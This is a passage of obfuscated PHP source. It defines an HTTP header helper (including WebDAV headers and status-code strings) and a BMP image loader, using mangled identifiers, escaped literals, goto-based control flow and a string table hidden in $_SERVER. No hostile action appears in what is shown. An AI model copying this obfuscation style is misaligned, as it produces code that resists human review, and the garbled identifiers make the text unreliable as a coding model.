$f†…¦©ŸëÇ) { header($f†…¦©ŸëÇ); } goto B„œ‚Ï£Üå; B„œ‚Ï£Üå: if (is_string($c¼ìˆµöº‹[$C™äºÇÔî[1722]])) { header($C™äºÇÔî[1725]); $A‰ö–Ñã× = $C™äºÇÔî[1726] . $C™äºÇÔî[214] . $c¼ìˆµöº‹[$C™äºÇÔî[1722]]; echo $A‰ö–Ñã×; } goto EŒ¹—­ğß; e£´ÒÅ›¥: $C™äºÇÔî =& $_SERVER[÷ÖêïÔÔÓ]; $fµ×ôíöÓ = is_array($c¼ìˆµöº‹[$C™äºÇÔî[1166]]) ? $c¼ìˆµöº‹[$C™äºÇÔî[1166]] : array(); $fµ×ôíöÓ[] = HttpHeader::code($c¼ìˆµöº‹[$C™äºÇÔî[1006]]); goto bğŸº¸ê«; EŒ¹—­ğß: } } class HttpHeader { public static $_headers = array("\x48\157\163\x74" => "\x48\x54\x54\120\137\110\x4f\x53\x54", "\x55\163\x65\x72\55\101\x67\x65\x6e\164" => "\110\124\124\x50\137\125\123\105\122\x5f\101\x47\105\x4e\124", "\103\x6f\x6e\x74\145\156\164\x2d\124\171\160\145" => "\110\124\124\x50\x5f\103\117\116\124\105\x4e\124\137\x54\131\120\105", "\x43\157\156\x74\145\x6e\x74\x2d\114\x65\x6e\147\x74\150" => "\110\124\124\x50\137\x43\x4f\x4e\124\105\116\x54\137\x4c\x45\116\107\x54\x48", "\x44\145\x70\x74\150" => "\x48\x54\x54\x50\x5f\104\x45\120\x54\x48", "\x45\x78\160\145\x63\x74" => "\x48\124\x54\x50\x5f\x45\130\120\105\103\124", "\111\146\x2d\116\x6f\x6e\145\55\115\x61\x74\x63\x68" => "\x48\124\x54\x50\137\x49\106\137\116\117\116\105\x5f\115\x41\x54\x43\110", "\x49\146\55\x4d\141\x74\143\x68" => "\x48\x54\124\x50\137\x49\x46\x5f\115\101\124\103\110", "\111\x66\x2d\122\141\156\147\x65" => "\110\124\x54\120\137\111\x46\x5f\122\101\116\107\105", "\114\141\163\x74\55\115\x6f\x64\x69\146\151\145\144" => "\x48\x54\124\120\137\x4c\101\123\124\137\x4d\x4f\104\x49\x46\x49\x45\104", "\x49\146\x2d\115\x6f\144\x69\x66\x69\145\x64\55\x53\151\156\143\x65" => "\110\124\x54\x50\x5f\111\x46\137\x4d\x4f\104\111\106\x49\x45\x44\x5f\123\111\116\103\105", "\x49\146\55\x55\156\155\157\144\151\x66\x69\x65\x64\55\x53\151\x6e\x63\x65" => "\x48\124\124\x50\x5f\111\x46\137\x55\x4e\x4d\x4f\104\111\x46\x49\105\x44\137\x53\x49\x4e\x43\x45", "\122\141\x6e\x67\x65" => "\110\x54\124\120\x5f\x52\101\x4e\x47\105", "\x54\151\x6d\145\157\165\x74" => "\110\x54\x54\x50\137\x54\111\x4d\105\x4f\125\x54", "\x49\146" => "\110\x54\x54\x50\137\x49\106", "\114\x6f\x63\153\x2d\x54\157\x6b\145\x6e" => "\110\124\x54\x50\x5f\x4c\117\103\113\x5f\x54\x4f\113\105\116", "\117\166\x65\162\167\162\151\164\145" => "\110\x54\x54\120\x5f\x4f\126\105\x52\127\x52\x49\124\x45", "\104\x65\x73\x74\151\x6e\x61\164\x69\157\x6e" => "\x48\124\x54\x50\137\x44\x45\123\x54\111\x4e\x41\x54\111\117\x4e", "\122\x65\x71\165\x65\163\x74\55\x49\x64" => "\x52\x45\121\x55\105\x53\x54\137\x49\104", "\122\145\x71\x75\x65\163\164\x2d\x42\157\x64\x79\55\x46\151\154\x65" => "\122\105\x51\125\105\x53\124\137\102\117\104\131\137\106\x49\x4c\x45", "\x52\x65\144\151\162\x65\x63\164\55\123\164\141\164\x75\163" => "\x52\x45\x44\111\122\x45\103\x54\137\x53\x54\101\x54\x55\123"); public static function init() { static $cÕ•ŠÕŞ²£ = false; if ($cÕ•ŠÕŞ²£) { return; } foreach ($_SERVER as $e çÎËƒ¢¹ => $fŠ¨‰¸ùÑ…) { $e çÎËƒ¢¹ = strtoupper($e çÎËƒ¢¹); if (!array_key_exists($e çÎËƒ¢¹, $_SERVER)) { continue; } $_SERVER[$e çÎËƒ¢¹] = $fŠ¨‰¸ùÑ…; } foreach (self::$_headers as $e çÎËƒ¢¹ => $b‰˜ÅïÑ¾Ä) { if (!array_key_exists($e çÎËƒ¢¹, $_SERVER)) { continue; } $_SERVER[$e çÎËƒ¢¹] = $_SERVER[$b‰˜ÅïÑ¾Ä]; $_SERVER[strtoupper($e çÎËƒ¢¹)] = $_SERVER[$b‰˜ÅïÑ¾Ä]; } } public static function get($AŒÄÜ‡ä‡) { self::init(); return $_SERVER[$AŒÄÜ‡ä‡] ? $_SERVER[$AŒÄÜ‡ä‡] : $_SERVER[$_SERVER[÷ÖêïÔÔÓ][1727] . strtoupper($AŒÄÜ‡ä‡)]; } public static function method() { return strtoupper(self::get($_SERVER[÷ÖêïÔÔÓ][149])); } public static function length() { $F™“Ì”†ƒ =& $_SERVER[÷ÖêïÔÔÓ]; $Eà”Òœ´§ = self::get($F™“Ì”†ƒ[1728]); if (!$Eà”Òœ´§) { $Eà”Òœ´§ = self::get($F™“Ì”†ƒ[1104]); } return $Eà”Òœ´§; } public static function range() { $B˜ìªª›‚İ =& $_SERVER[÷ÖêïÔÔÓ]; $dİ©¥²óŒ‡ = self::get($B˜ìªª›‚İ[195]); if (!$dİ©¥²óŒ‡) { return !1; } if (!preg_match($B˜ìªª›‚İ[1729], $dİ©¥²óŒ‡, $Dßã³˜µàí)) { return !1; } if ($Dßã³˜µàí[1] === $B˜ìªª›‚İ[33] && $Dßã³˜µàí[2] === $B˜ìªª›‚İ[33]) { return !1; } return array($Dßã³˜µàí[1] !== $B˜ìªª›‚İ[33] ? $Dßã³˜µàí[1] : null, $Dßã³˜µàí[2] !== $B˜ìªª›‚İ[33] ? $Dßã³˜µàí[2] : null); } public static $statusCode = array("\61\60\60" => "\103\x6f\156\x74\151\x6e\165\145", "\61\x30\x31" => "\123\167\151\164\x63\150\151\156\x67\x20\x50\x72\157\164\157\x63\x6f\x6c", "\61\x30\x32" => "\x50\x72\x6f\x63\145\x73\x73\x69\x6e\147", "\x31\60\63" => "\x45\141\162\x6c\x79\40\x48\151\x6e\164\163", "\x32\60\60" => "\x4f\x4b", "\x32\x30\61" => "\x43\162\x65\x61\x74\145\144", "\x32\x30\62" => "\101\143\x63\x65\160\164\x65\x64", "\x32\60\x33" => "\116\157\x6e\55\x41\165\164\x68\x6f\x72\x69\164\x61\x74\151\166\x65\40\111\x6e\146\157\x72\x6d\141\x74\151\x6f\x6e", "\62\60\64" => "\116\x6f\x20\x43\157\156\164\x65\x6e\164", "\62\60\65" => "\x52\145\x73\145\x74\x20\103\157\156\x74\145\x6e\x74", "\x32\60\66" => "\120\x61\x72\164\151\x61\154\40\103\157\x6e\x74\x65\156\164", "\62\x30\x37" => "\115\165\x6c\164\x69\x2d\123\x74\x61\164\165\163", "\63\60\60" => "\x4d\165\154\x74\x69\x70\x6c\x65\x20\103\x68\157\x69\143\x65\163", "\x33\60\x31" => "\x4d\x6f\x76\145\x64\40\x50\145\x72\155\141\156\145\x6e\164\154\x79", "\63\x30\62" => "\106\157\x75\x6e\x64", "\x33\60\63" => "\123\x65\145\x20\x4f\x74\x68\x65\x72", "\63\60\x34" => "\116\157\164\x20\115\x6f\x64\x69\x66\x69\145\x64", "\x33\60\65" => "\125\163\x65\40\x50\162\x6f\x78\x79", "\63\x30\67" => "\124\x65\155\160\x6f\162\x61\x72\x79\40\122\145\x64\x69\162\x65\x63\x74", "\x33\60\x38" => "\120\x65\x72\155\141\x6e\145\x6e\x74\40\122\x65\x64\x69\162\x65\143\x74", "\64\x30\x30" => "\x42\141\x64\x20\x52\x65\x71\165\x65\x73\164", "\64\x30\x31" => "\125\x6e\x61\x75\164\150\x6f\x72\x69\172\x65\x64", "\64\60\62" => "\x50\141\171\155\x65\156\164\40\122\x65\x71\165\x69\x72\145\x64", "\x34\60\x33" => "\x46\157\162\x62\151\144\144\145\x6e", "\64\x30\x34" => "\x4e\157\164\40\106\157\x75\x6e\x64", "\x34\60\x35" => "\115\145\x74\x68\157\144\40\x4e\157\x74\40\101\154\x6c\157\167\145\x64", "\64\x30\66" => "\116\157\x74\40\x41\x63\x63\145\x70\x74\x61\x62\154\145", "\x34\60\67" => "\x50\x72\157\x78\171\40\101\165\x74\x68\x65\x6e\x74\151\143\x61\164\151\157\156\x20\122\x65\161\x75\151\162\x65\144", "\64\x30\x38" => "\x52\x65\x71\165\145\163\164\x20\124\151\x6d\x65\x6f\165\164", "\64\60\x39" => "\103\157\x6e\x66\x6c\x69\143\164", "\64\x31\x30" => "\107\157\156\145", "\x34\x31\61" => "\x4c\145\x6e\x67\164\x68\40\x52\145\161\x75\151\x72\145\144", "\x34\x31\x32" => "\120\x72\x65\x63\x6f\x6e\x64\151\x74\151\x6f\x6e\x20\106\141\151\x6c\x65\x64", "\x34\x31\x33" => "\122\x65\161\165\145\x73\x74\x20\x45\156\x74\x69\164\171\x20\124\x6f\157\40\114\141\162\147\x65", "\64\x31\64" => "\x52\x65\161\165\145\x73\x74\40\x55\x52\111\40\x54\157\157\x20\x4c\141\162\x67\145", "\x34\x31\x35" => "\x55\156\163\x75\x70\160\157\x72\x74\x65\x64\40\x4d\145\144\x69\141\40\x54\x79\160\145", "\64\61\66" => "\122\x65\161\165\x65\x73\164\145\144\x20\122\x61\156\x67\x65\x20\x4e\x6f\164\40\123\141\x74\x69\x73\x66\151\x61\x62\x6c\145", "\x34\x31\67" => "\105\x78\x70\x65\x63\x74\x61\x74\151\x6f\156\40\106\x61\x69\154\145\x64", "\x34\x32\62" => "\x55\x6e\160\162\x6f\x63\x65\x73\x73\141\x62\154\x65\x20\x45\x6e\x74\151\164\171", "\x34\62\63" => "\114\x6f\143\x6b\x65\x64", "\64\62\x34" => "\x46\141\x69\154\145\144\x20\x44\x65\x70\x65\x6e\144\x65\x6e\143\x79", "\64\62\65" => "\x55\156\157\x72\x64\x65\162\x65\x64\40\x43\x6f\x6c\x6c\x65\143\x74\x69\x6f\x6e", "\64\62\x36" => "\x55\160\x67\x72\141\144\145\x20\x52\145\161\x75\151\162\x65\144", "\64\62\x38" => "\x50\x72\x65\x63\x6f\x6e\144\x69\x74\x69\x6f\156\x20\122\145\x71\165\x69\162\x65\144", "\x34\x32\x39" => "\124\157\157\x20\115\x61\156\x79\40\x52\145\x71\165\x65\163\164\163", "\x34\63\61" => "\x52\145\161\x75\x65\x73\164\x20\110\x65\141\x64\145\162\x20\106\x69\x65\x6c\x64\163\x20\124\157\x6f\x20\114\x61\162\147\145", "\64\64\64" => "\116\x6f\40\122\145\163\160\x6f\156\163\x65", "\64\x35\60" => "\x42\154\x6f\143\153\145\x64\x20\142\171\40\127\151\156\144\x6f\x77\x73\40\x50\x61\x72\145\x6e\164\x61\x6c\x20\103\x6f\x6e\164\x72\157\x6c\163", "\64\65\x31" => "\x55\x6e\141\166\141\x69\x6c\x61\142\154\x65\40\106\157\162\x20\x4c\145\147\x61\x6c\40\122\x65\141\163\157\x6e\x73", "\x34\x39\x34" => "\x52\x65\161\165\145\x73\164\40\110\x65\141\x64\x65\162\40\x54\x6f\157\x20\x4c\141\x72\147\145", "\x35\60\x30" => "\x49\156\x74\x65\x72\x6e\x61\154\40\x53\145\162\x76\145\162\40\x45\162\x72\x6f\x72", "\x35\x30\x31" => "\116\x6f\x74\x20\x49\x6d\160\x6c\x65\155\x65\x6e\x74\145\144", "\x35\x30\62" => "\102\x61\144\40\x47\x61\164\x65\x77\x61\171", "\65\60\x33" => "\x53\145\162\166\x69\143\x65\40\x55\x6e\x61\x76\141\151\x6c\141\142\154\x65", "\x35\x30\x34" => "\107\141\164\145\x77\x61\171\40\124\x69\x6d\x65\157\165\x74", "\65\60\x35" => "\110\x54\x54\120\x20\126\x65\162\163\x69\x6f\x6e\x20\x6e\157\164\x20\x73\x75\x70\x70\x6f\x72\164\145\x64", "\65\x30\67" => "\111\x6e\163\165\146\x66\x69\143\x69\145\156\x74\40\123\x74\x6f\x72\x61\147\145"); public static function code($e§¥³¨‡¸Á) { $C‹àšá®¥Í =& $_SERVER[÷ÖêïÔÔÓ]; $e§¥³¨‡¸Á = $e§¥³¨‡¸Á . $C‹àšá®¥Í[33]; $bëá…Õ«ï† = self::$statusCode[$e§¥³¨‡¸Á]; $bëá…Õ«ï† = $bëá…Õ«ï† ? "\110\x54\x54\x50\57\61\56\61\x20{$e§¥³¨‡¸Á}\x20" . $bëá…Õ«ï† : $C‹àšá®¥Í[33]; return $bëá…Õ«ï†; } } class ImageGdBMP { public static function load($DóÇ½­ôÍ) { $A®¨ĞŞ¼… = fopen($DóÇ½­ôÍ, $_SERVER[÷ÖêïÔÔÓ][1420]); if ($A®¨ĞŞ¼… === !1) { return !1; } $fŠ²ëùŒ‘ = self::loadFromStream($A®¨ĞŞ¼…); fclose($A®¨ĞŞ¼…); return $fŠ²ëùŒ‘; } public static function loadFromStream($E¬Ä¾öÑç«) { $a¹†«ÅŒŠ¿ =& $_SERVER[÷ÖêïÔÔÓ]; $CÀŒóÈà¹ç = fread($E¬Ä¾öÑç«, 14); if ($CÀŒóÈà¹ç === !1) { return !1; } if ($CÀŒóÈà¹ç[0] != $a¹†«ÅŒŠ¿[1730] || $CÀŒóÈà¹ç[1] != $a¹†«ÅŒŠ¿[1731]) { return !1; } $C…×ØÊ…† = unpack($a¹†«ÅŒŠ¿[1732] . $a¹†«ÅŒŠ¿[1733] . $a¹†«ÅŒŠ¿[1734] . $a¹†«ÅŒŠ¿[1735] . $a¹†«ÅŒŠ¿[1736], $CÀŒóÈà¹ç); return self::loadFromStreamAndFileHeader($E¬Ä¾öÑç«, $C…×ØÊ…†); } public static function loadFromStreamAndFileHeader($A“Î°õÖÀ, array $FšÅ¢¡«©) { goto b“¬ÇìÊÇÕ; b“¬ÇìÊÇÕ: $DîÉŠ¥…Ğ =& $_SERVER[÷ÖêïÔÔÓ]; if ($FšÅ¢¡«©[$DîÉŠ¥…Ğ[385]] != 19778) { return !1; } $f…â¸¡òº´ = fread($A“Î°õÖÀ, 4); goto A®Úßâ“£Î; b‡ÚÛ¯³ğ: if ($DÎùğ Ëøê == 1 || $DÎùğ Ëøê == 4 || $DÎùğ Ëøê == 8) { goto AÜë›íİ¥ø; Aå÷óÓÕ™: $b»²é¸ƒ… = array(); for ($dèÍæÜ†¼ = 0; $dèÍæÜ†¼ < $bİ™¢¿•Ÿ½; ++$dèÍæÜ†¼) { $f…â¸¡òº´ = fread($A“Î°õÖÀ, $Dà“©®’); if ($f…â¸¡òº´ === !1) { imagedestroy($fİ•Ô¿ƒ”¢); return !1; } extract(unpack($DîÉŠ¥…Ğ[1756], $f…â¸¡òº´ . $DîÉŠ¥…Ğ[1755])); $b»²é¸ƒ…[] = imagecolorallocate($fİ•Ô¿ƒ”¢, $E¯‡¯·¥ğ‹, $BÔœ´¸Åç, $B’ó‘éÚîƒ); } $EªˆÈù¢Óš = 8 - $DÎùğ Ëøê; goto eÈ÷Œ‹‡¤İ; eÈ÷Œ‹‡¤İ: $eÈÄôŸĞŒå = (1 << $DÎùğ Ëøê) - 1 << $EªˆÈù¢Óš; if ($d³¾‹©Œ¼¹ == 1 || $d³¾‹©Œ¼¹ == 2) { $A½‡÷ìœÇ¦ = 0; $dØôöÆ¯ö³ = $DÎùğ Ëøê >> 2 & 1; for (;;) { if ($A½‡÷ìœÇ¦ < -1 || $A½‡÷ìœÇ¦ > $C‰”Ì‰‰ºê || $F‡¶×çÈ­© < -1 || $F‡¶×çÈ­© > $e­óïğ¦¶°) { imagedestroy($fİ•Ô¿ƒ”¢); return !1; } $f…â¸¡òº´ = fread($A“Î°õÖÀ, 1); if ($f…â¸¡òº´ === !1) { imagedestroy($fİ•Ô¿ƒ”¢); return !1; } switch ($f…â¸¡òº´) { case $DîÉŠ¥…Ğ[1755]: $f…â¸¡òº´ = fread($A“Î°õÖÀ, 1); if ($f…â¸¡òº´ === !1) { imagedestroy($fİ•Ô¿ƒ”¢); return !1; } switch ($f…â¸¡òº´) { case $DîÉŠ¥…Ğ[1755]: $F‡¶×çÈ­© += $AÁª½•‚´; $A½‡÷ìœÇ¦ = 0; break; case $DîÉŠ¥…Ğ[1757]: $F‡¶×çÈ­© = 0; $A½‡÷ìœÇ¦ = 0; break 3; case $DîÉŠ¥…Ğ[1758]: $f…â¸¡òº´ = fread($A“Î°õÖÀ, 2); if ($f…â¸¡òº´ === !1) { imagedestroy($fİ•Ô¿ƒ”¢); return !1; } list(, $cÌ±ª‹Š¤, $béä‚”¶) = unpack($DîÉŠ¥…Ğ[1759], $f…â¸¡òº´); $A½‡÷ìœÇ¦ += $cÌ±ª‹Š¤; $F‡¶×çÈ­© += $béä‚”¶ * $AÁª½•‚´; break; default: list(, $bˆ¬£ÆªÇ–) = unpack($DîÉŠ¥…Ğ[1760], $f…â¸¡òº´); $cù¿Ô‚å¡Õ = ($bˆ¬£ÆªÇ– >> $dØôöÆ¯ö³) + ($bˆ¬£ÆªÇ– & $dØôöÆ¯ö³); $f…â¸¡òº´ = fread($A“Î°õÖÀ, $cù¿Ô‚å¡Õ + 1 & ~1); if ($f…â¸¡òº´ === !1) { imagedestroy($fİ•Ô¿ƒ”¢); return !1; } for ($dèÍæÜ†¼ = 0, $fÓ©Ìâ·õ‚ = 0; $dèÍæÜ†¼ < $bˆ¬£ÆªÇ–; ++$dèÍæÜ†¼, ++$A½‡÷ìœÇ¦, $fÓ©Ìâ·õ‚ += $DÎùğ Ëøê) { list(, $dˆŸÛ†ßÓĞ) = unpack($DîÉŠ¥…Ğ[1760], $f…â¸¡òº´[$fÓ©Ìâ·õ‚ >> 3]); $B’ó‘éÚîƒ = $fÓ©Ìâ·õ‚ & 7; imagesetpixel($fİ•Ô¿ƒ”¢, $A½‡÷ìœÇ¦, $F‡¶×çÈ­©, $b»²é¸ƒ…[($dˆŸÛ†ßÓĞ & $eÈÄôŸĞŒå >> $B’ó‘éÚîƒ) >> $EªˆÈù¢Óš - $B’ó‘éÚîƒ]); } break; } break; default: $AÔ†–ââÜ£ = fread($A“Î°õÖÀ, 1); if ($AÔ†–ââÜ£ === !1) { imagedestroy($fİ•Ô¿ƒ”¢); return !1; } list(, $A²ÀÉ–„­õ, $dˆŸÛ†ßÓĞ) = unpack($DîÉŠ¥…Ğ[1759], $f…â¸¡òº´ . $AÔ†–ââÜ£); for ($dèÍæÜ†¼ = 0, $fÓ©Ìâ·õ‚ = 0; $dèÍæÜ†¼ < $A²ÀÉ–„­õ; ++$dèÍæÜ†¼, ++$A½‡÷ìœÇ¦, $fÓ©Ìâ·õ‚ += $DÎùğ Ëøê) { $B’ó‘éÚîƒ = $fÓ©Ìâ·õ‚ & 7; imagesetpixel($fİ•Ô¿ƒ”¢, $A½‡÷ìœÇ¦, $F‡¶×çÈ­©, $b»²é¸ƒ…[($dˆŸÛ†ßÓĞ & $eÈÄôŸĞŒå >> $B’ó‘éÚîƒ) >> $EªˆÈù¢Óš - $B’ó‘éÚîƒ]); } break; } } } else { for ($C†Ö†ßùæ = 0; $C†Ö†ßùæ < $dí˜‘•«£; ++$C†Ö†ßùæ, $F‡¶×çÈ­© += $AÁª½•‚´) { $f…â¸¡òº´ = fread($A“Î°õÖÀ, $C¶°Ú‘‹¸Ø); if ($f…â¸¡òº´ === !1) { imagedestroy($fİ•Ô¿ƒ”¢); return !1; } $fÓ©Ìâ·õ‚ = 0; for ($A½‡÷ìœÇ¦ = 0; $A½‡÷ìœÇ¦ < $C‰”Ì‰‰ºê; ++$A½‡÷ìœÇ¦, $fÓ©Ìâ·õ‚ += $DÎùğ Ëøê) { list(, $dˆŸÛ†ßÓĞ) = unpack($DîÉŠ¥…Ğ[1760], $f…â¸¡òº´[$fÓ©Ìâ·õ‚ >> 3]); $B’ó‘éÚîƒ = $fÓ©Ìâ·õ‚ & 7; imagesetpixel($fİ•Ô¿ƒ”¢, $A½‡÷ìœÇ¦, $F‡¶×çÈ­©, $b»²é¸ƒ…[($dˆŸÛ†ßÓĞ & $eÈÄôŸĞŒå >> $B’ó‘éÚîƒ) >> $EªˆÈù¢Óš - $B’ó‘éÚîƒ]); } } } goto cÖ­‰¬©Ñ; AÜë›íİ¥ø: $fİ•Ô¿ƒ”¢ = imagecreate($C‰”Ì‰‰ºê, $dí˜‘•«£); $Dà“©®’ = $Fƒˆáâ ×¸ == 12 ? 3 : 4; $bİ™¢¿•Ÿ½ = $Fœ”™ìªß‘ ? $Fœ”™ìªß‘ : pow(2, $DÎùğ Ëøê); goto Aå÷óÓÕ™; cÖ­‰¬©Ñ: } else { goto F„ÛìÆ›õ; F°®­àöƒ¸: for ($C†Ö†ßùæ = 0; $C†Ö†ßùæ < $dí˜‘•«£; ++$C†Ö†ßùæ, $F‡¶×çÈ­© += $AÁª½•‚´) { $f…â¸¡òº´ = fread($A“Î°õÖÀ, $C¶°Ú‘‹¸Ø); if ($f…â¸¡òº´ === !1) { imagedestroy($fİ•Ô¿ƒ”¢); return !1; } $fÓ©Ìâ·õ‚ = 0; for ($A½‡÷ìœÇ¦ = 0; $A½‡÷ìœÇ¦ < $C‰”Ì‰‰ºê; ++$A½‡÷ìœÇ¦, $fÓ©Ìâ·õ‚ += $a·ê÷ïìß) { list(, $dˆŸÛ†ßÓĞ) = unpack($DîÉŠ¥…Ğ[1737], substr($f…â¸¡òº´, $fÓ©Ìâ·õ‚, $a·ê÷ïìß) . $DîÉŠ¥…Ğ[1761]); $dã·ğ—øˆ´ = $dˆŸÛ†ßÓĞ & $Dî¶ÂÓÒ…; $FÅ³±£¨°È = $dˆŸÛ†ßÓĞ & $d÷Œ»‰¾Ãƒ; $DĞÕã‘‹† = $dˆŸÛ†ßÓĞ & $eèªÃ¯êƒÌ; $e¯œ–µùïã = $dˆŸÛ†ßÓĞ & $bØïƒŠöË•; $b¯…ªôäŞ = $AŸ ù¶ßÀà - (($dã·ğ—øˆ´ << 7) - $dã·ğ—øˆ´) * $FÄ¤â¨ê‚é; $E¯‡¯·¥ğ‹ = (($FÅ³±£¨°È << 8) - $FÅ³±£¨°È) * $e¡Ãù‡†Á§; $BÔœ´¸Åç = (($DĞÕã‘‹† << 8) - $DĞÕã‘‹†) * $Eºâ‹¤…æö; $B’ó‘éÚîƒ = (($e¯œ–µùïã << 8) - $e¯œ–µùïã) * $f‚½ÌŞ“……; imagesetpixel($fİ•Ô¿ƒ”¢, $A½‡÷ìœÇ¦, $F‡¶×çÈ­©, $b¯…ªôäŞ << 24 | $E¯‡¯·¥ğ‹ << 16 | $BÔœ´¸Åç << 8 | $B’ó‘éÚîƒ); } } imagealphablending($fİ•Ô¿ƒ”¢, !0); goto EÛ¢è¯Õ; bÇÖÆ˜¡›Û: $a·ê÷ïìß = $DÎùğ Ëøê >> 3; $AŸ ù¶ßÀà = $Dî¶ÂÓÒ… ? 127 : 0; $FÄ¤â¨ê‚é = $Dî¶ÂÓÒ… ? 1 / $Dî¶ÂÓÒ… : 1; goto DÂïñ“×Ü; F„ÛìÆ›õ: $fİ•Ô¿ƒ”¢ = imagecreatetruecolor($C‰”Ì‰‰ºê, $dí˜‘•«£); imagealphablending($fİ•Ô¿ƒ”¢, !1); if ($Dî¶ÂÓÒ…) { imagesavealpha($fİ•Ô¿ƒ”¢, !0); } goto bÇÖÆ˜¡›Û; DÂïñ“×Ü: $e¡Ãù‡†Á§ = $d÷Œ»‰¾Ãƒ ? 1 / $d÷Œ»‰¾Ãƒ : 1; $Eºâ‹¤…æö = $eèªÃ¯êƒÌ ? 1 / $eèªÃ¯êƒÌ : 1; $f‚½ÌŞ“…… = $bØïƒŠöË• ? 1 / $bØïƒŠöË• : 1; goto F°®­àöƒ¸; EÛ¢è¯Õ: } return $fİ•Ô¿ƒ”¢; goto bõöàÑË¤ù; A®Úßâ“£Î: if ($f…â¸¡òº´ === !1) { return !1; } list(, $Fƒˆáâ ×¸) = unpack($DîÉŠ¥…Ğ[1737], $f…â¸¡òº´); if ($Fƒˆáâ ×¸ == 12) { goto b®ËÛ›´–÷; b®ËÛ›´–÷: $f…â¸¡òº´ = fread($A“Î°õÖÀ, $Fƒˆáâ ×¸ - 4); if ($f…â¸¡òº´ === !1) { return !1; } extract(unpack($DîÉŠ¥…Ğ[1738] . $DîÉŠ¥…Ğ[1739] . $DîÉŠ¥…Ğ[1740] . $DîÉŠ¥…Ğ[1741], $f…â¸¡òº´)); goto Dº…®Ø¤„”; Dº…®Ø¤„”: $Fœ”™ìªß‘ = $CÕ¯ğâ’ˆ = $Dî¶ÂÓÒ… = $d³¾‹©Œ¼¹ = 0; $d÷Œ»‰¾Ãƒ = 16711680; $eèªÃ¯êƒÌ = 65280; goto BíÎÓÚÇâ; BíÎÓÚÇâ: $bØïƒŠöË• = 255; goto c“©ôÁ¸Å; c“©ôÁ¸Å: } else { if (124 < $Fƒˆáâ ×¸ || $Fƒˆáâ ×¸ < 40) { return !1; } else { goto Dâ°¶ê§±ø; Cšƒé¾™„Ò: if ($C‰”Ì‰‰ºê & 2147483648) { $C‰”Ì‰‰ºê = -(~$C‰”Ì‰‰ºê & 4294967295) - 1; } if ($e­óïğ¦¶° & 2147483648) { $e­óïğ¦¶° = -(~$e­óïğ¦¶° & 4294967295) - 1; } if ($aË°„…åóÍ & 2147483648) { $aË°„…åóÍ = -(~$aË°„…åóÍ & 4294967295) - 1; } goto cÒ•ªï´Ñ»; cÒ•ªï´Ñ»: if ($eÆ‡¾‘¤‚Š & 2147483648) { $eÆ‡¾‘¤‚Š = -(~$eÆ‡¾‘¤‚Š & 4294967295) - 1; } if ($FšÅ¢¡«©[$DîÉŠ¥…Ğ[513]] != 0) { $eÖ†Ã‹·£ = $DÎùğ Ëøê == 1 || $DÎùğ Ëøê == 4 || $DÎùğ Ëøê == 8 ? ($Fœ”™ìªß‘ ? $Fœ”™ìªß‘ : pow(2, $DÎùğ Ëøê)) << 2 : 0; $D¥Ë“‘İ§ğ = $EÑÙ±‡Ã ë ? $EÑÙ±‡Ã ë : ($C‰”Ì‰‰ºê * $DÎùğ Ëøê + 31 >> 3 & ~3) * abs($e­óïğ¦¶°); $FÈßÏ¤Ú’ƒ = $FšÅ¢¡«©[$DîÉŠ¥…Ğ[513]] - $D¥Ë“‘İ§ğ - $eÖ†Ã‹·£ - 14; if ($Fƒˆáâ ×¸ < $FÈßÏ¤Ú’ƒ && 40 <= $Fƒˆáâ ×¸ && $Fƒˆáâ ×¸ <= 124) { $Fƒˆáâ ×¸ = $FÈßÏ¤Ú’ƒ; } } if ($Fƒˆáâ ×¸ - 40 > 0) { $f…â¸¡òº´ = fread($A“Î°õÖÀ, $Fƒˆáâ ×¸ - 40); if ($f…â¸¡òº´ === !1) { return !1; } extract(unpack($DîÉŠ¥…Ğ[1751] . $DîÉŠ¥…Ğ[1752] . $DîÉŠ¥…Ğ[1753] . $DîÉŠ¥…Ğ[1754], $f…â¸¡òº´ . str_repeat($DîÉŠ¥…Ğ[1755], 120))); } else { $Dî¶ÂÓÒ… = $d÷Œ»‰¾Ãƒ = $eèªÃ¯êƒÌ = $bØïƒŠöË• = 0; } goto f„øµ‹Ò¾; Dâ°¶ê§±ø: $f…â¸¡òº´ = fread($A“Î°õÖÀ, 36); if ($f…â¸¡òº´ === !1) { return !1; } extract(unpack($DîÉŠ¥…Ğ[1742] . $DîÉŠ¥…Ğ[1743] . $DîÉŠ¥…Ğ[1740] . $DîÉŠ¥…Ğ[1744] . $DîÉŠ¥…Ğ[1745] . $DîÉŠ¥…Ğ[1746] . $DîÉŠ¥…Ğ[1747] . $DîÉŠ¥…Ğ[1748] . $DîÉŠ¥…Ğ[1749] . $DîÉŠ¥…Ğ[1750], $f…â¸¡òº´)); goto Cšƒé¾™„Ò; f„øµ‹Ò¾: if (($DÎùğ Ëøê == 16 || $DÎùğ Ëøê == 24 || $DÎùğ Ëøê == 32) && $d³¾‹©Œ¼¹ == 0 && $d÷Œ»‰¾Ãƒ == 0 && $eèªÃ¯êƒÌ == 0 && $bØïƒŠöË• == 0) { switch ($DÎùğ Ëøê) { case 16: $d÷Œ»‰¾Ãƒ = 31744; $eèªÃ¯êƒÌ = 992; $bØïƒŠöË• = 31; break; case 24: case 32: $d÷Œ»‰¾Ãƒ = 16711680; $eèªÃ¯êƒÌ = 65280; $bØïƒŠöË• = 255; break; } } goto E“–’µ‘ƒ; E“–’µ‘ƒ: } } goto aÎ‚ÚïŠã; A§­ß¡¯‹©: $dí˜‘•«£ = abs($e­óïğ¦¶°); $F‡¶×çÈ­© = $e­óïğ¦¶° > 0 ? $dí˜‘•«£ - 1 : 0; $AÁª½•‚´ = $e­óïğ¦¶° > 0 ? -1 : 1; goto b‡ÚÛ¯³ğ; aÎ‚ÚïŠã: if ($C‰”Ì‰‰ºê == 0 || $e­óïğ¦¶° == 0 || $E£à˜åõ•µ != 1 || ($Dî¶ÂÓÒ… & $d÷Œ»‰¾Ãƒ) != 0 || ($Dî¶ÂÓÒ… & $eèªÃ¯êƒÌ) != 0 || ($Dî¶ÂÓÒ… & $bØïƒŠöË•) != 0 || ($d÷Œ»‰¾Ãƒ & $eèªÃ¯êƒÌ) != 0 || ($d÷Œ»‰¾Ãƒ & $bØïƒŠöË•) != 0 || ($eèªÃ¯êƒÌ & $bØïƒŠöË•) != 0) { return !1; } if ($d³¾‹©Œ¼¹ == 4 || $d³¾‹©Œ¼¹ == 5) { $f…â¸¡òº´ = stream_get_contents($A“Î°õÖÀ, $EÑÙ±‡Ã ë); if ($f…â¸¡òº´ === !1) { return !1; } return imagecreatefromstring($f…â¸¡òº´); } $C¶°Ú‘‹¸Ø = $C‰”Ì‰‰ºê * $DÎùğ Ëøê + 31 >> 3 & 